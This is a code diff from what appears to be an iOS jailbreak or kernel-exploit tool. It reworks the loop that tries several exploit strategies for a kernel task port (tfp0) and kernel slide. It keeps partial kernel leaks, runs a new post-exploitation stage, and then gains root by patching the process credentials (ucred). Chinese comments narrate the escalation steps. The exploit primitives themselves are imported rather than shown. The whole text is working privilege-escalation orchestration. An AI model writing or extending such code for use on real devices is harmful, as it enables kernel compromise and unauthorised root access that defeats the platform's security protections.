@@ -7,6 +7,7 @@
 #import "mcm/MCMLease.h"
 #import "exploit/SockPortStrategy.h"
 #import "exploit/OtherExploitStrategies.h"
+#import "exploit/PostExploit.h"
 #import "kernel/RealDeviceKernelMemory.h"
 #import "kernel/VersionedOffsetProvider.h"
 #import "permissions/KernelUcredStealer.h"
@@ -61,6 +62,9 @@ using namespace permissions;
     mach_port_t tfp0 = MACH_PORT_NULL;
     uint64_t kernel_base = 0;
     uint64_t kernel_slide = 0;
+    ExploitResult best_result;
+    memset(&best_result, 0, sizeof(best_result));
+    bool found_leak = false;
 
     for (auto& strategy : strategies) {
         const char* name = strategy->Name();
@@ -76,34 +80,67 @@ using namespace permissions;
         ExploitResult result;
         memset(&result, 0, sizeof(result));
         if (strategy->DoExploit(&result) && result.success) {
+            strncpy(result.strategy_name, name, sizeof(result.strategy_name) - 1);
+            found_leak = true;
+            best_result = result;
             tfp0 = result.tfp0;
             kernel_base = result.kernel_base;
             kernel_slide = result.kernel_slide;
-            self.deviceExploited = YES;
-            NSLog(@"Finished exploitation with %@, going to escalate privileges.",
-                  [NSString stringWithUTF8String:name]);
-            break;
+            NSLog(@"Finished exploitation with %@, kernel_base=0x%llx, tfp0=%d",
+                  [NSString stringWithUTF8String:name], kernel_base, tfp0);
+
+            // 如果已经拿到真正的 tfp0, 直接成功
+            if (tfp0 != MACH_PORT_NULL) {
+                break;
+            }
+            // 否则继续尝试其他策略, 但保留这个泄露结果
+            NSLog(@"  Got kernel leak but no tfp0, trying more strategies...");
         } else {
             NSLog(@"  %@ failed", [NSString stringWithUTF8String:name]);
         }
     }
 
-    if (!self.deviceExploited) {
+    if (!found_leak) {
         NSLog(@"All exploits failed.");
+        self.deviceExploited = NO;
         return;
     }
 
-    // 权限提升: 修改 ucred 获取 root
-    NSLog(@"Escalating privileges via ucred patch...");
-    auto km = std::make_unique<RealDeviceKernelMemory>(tfp0);
-    auto offsets = VersionedOffsetProvider::MakeOffsetProvider();
+    // 后利用: 从泄露转换为 tfp0 + 提权
+    NSLog(@"Running post-exploitation...");
+    PostExploit post;
+    if (!post.Run(&best_result)) {
+        NSLog(@"Post-exploitation incomplete (may still have partial access)");
+    }
 
-    if (km && offsets) {
-        KernelUcredStealer stealer;
-        stealer.Steal(km.get(), offsets.get());
-        NSLog(@"Privilege escalation complete");
+    // 更新结果
+    tfp0 = best_result.tfp0;
+    kernel_slide = best_result.kernel_slide;
+
+    // 关键修复: 只有真正获取内核读写或 root 时才标记 exploited
+    if (best_result.have_kernel_read || best_result.have_kernel_write || post.IsRoot()) {
+        self.deviceExploited = YES;
+        NSLog(@"Device exploited successfully: tfp0=%d, root=%d, strategy=%s",
+              tfp0, post.IsRoot() ? 1 : 0, best_result.strategy_name);
     } else {
-        NSLog(@"Warning: cannot create kernel memory or offset provider");
+        self.deviceExploited = NO;
+        NSLog(@"Exploit got kernel leak but no rw/root, marking as not exploited");
+        return;
+    }
+
+    // 权限提升: 修改 ucred 获取 root (如果 PostExploit 还没做)
+    if (!post.IsRoot() && tfp0 != MACH_PORT_NULL) {
+        NSLog(@"Escalating privileges via ucred patch...");
+        auto km = std::make_unique<RealDeviceKernelMemory>(tfp0);
+        auto offsets = VersionedOffsetProvider::MakeOffsetProvider();
+
+        if (km && offsets) {
+            KernelUcredStealer stealer;
+            stealer.Steal(km.get(), offsets.get());
+            NSLog(@"Privilege escalation complete");
+        } else {
+            NSLog(@"Warning: cannot create kernel memory or offset provider");
+        }
     }
 
     // 尝试 MacDirtyCow (如果支持)
